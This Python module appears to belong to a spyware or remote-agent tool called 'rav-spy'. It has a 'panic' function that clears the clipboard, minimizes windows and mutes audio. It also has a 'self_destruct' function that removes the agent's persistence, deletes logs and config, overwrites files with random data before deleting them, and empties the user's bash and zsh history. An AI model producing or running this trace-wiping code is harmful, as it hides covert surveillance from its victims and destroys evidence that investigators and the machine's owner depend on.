"""
Self-Destruct & Panic — emergency cleanup, secure delete, trace removal.
"""
import os
import shutil
import subprocess
from pathlib import Path
from loguru import logger

CONFIG_DIR = Path.home() / ".config" / "rav-spy"


def panic():
    """Emergency: clear clipboard, hide windows, mute audio."""
    results = []
    try:
        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+c"], capture_output=True, timeout=5)
        for binary in ["xclip", "wl-copy"]:
            if shutil.which(binary):
                cmd = ["wl-copy", ""] if binary == "wl-copy" else ["xclip", "-selection", "c", "/dev/null"]
                subprocess.run(cmd, capture_output=True, timeout=5)
        results.append("clipboard cleared")
    except Exception as e:
        results.append(f"clipboard: {e}")

    try:
        subprocess.run(["xdotool", "windowminimize", "$(xdotool getactivewindow)"], shell=True, capture_output=True, timeout=5)
        results.append("windows minimized")
    except Exception:
        pass

    try:
        subprocess.run(["pactl", "set-sink-mute", "@DEFAULT_SINK@", "1"], capture_output=True, timeout=5)
        results.append("audio muted")
    except Exception:
        pass

    return "PANIC: " + ", ".join(results)


def self_destruct(keep_config: bool = False):
    """Hapus semua jejak: logs, config, persistence."""
    results = []

    try:
        from agent.persistence import remove
        results.append(remove("all"))
    except Exception as e:
        results.append(f"persistence removal: {e}")

    log_dirs = [
        Path("logs"),
        Path.home() / ".config" / "rav-spy" / "logs",
    ]
    for d in log_dirs:
        if d.exists():
            try:
                shutil.rmtree(str(d))
                results.append(f"logs removed: {d}")
            except Exception as e:
                results.append(f"log cleanup: {e}")

    if not keep_config and CONFIG_DIR.exists():
        try:
            for item in CONFIG_DIR.iterdir():
                if item.is_file():
                    _secure_delete(item)
            shutil.rmtree(str(CONFIG_DIR))
            results.append("config removed")
        except Exception as e:
            results.append(f"config cleanup: {e}")

    try:
        bash_history = Path.home() / ".bash_history"
        if bash_history.exists():
            bash_history.write_text("")
        zsh_history = Path.home() / ".zsh_history"
        if zsh_history.exists():
            zsh_history.write_text("")
        results.append("shell history cleared")
    except Exception as e:
        results.append(f"history: {e}")

    return "SELF-DESTRUCT: " + ", ".join(results)


def _secure_delete(path: Path):
    """Overwrite file with random data before deletion."""
    try:
        size = path.stat().st_size
        with open(path, "wb") as f:
            f.write(os.urandom(size))
        path.unlink()
    except Exception:
        path.unlink(missing_ok=True)
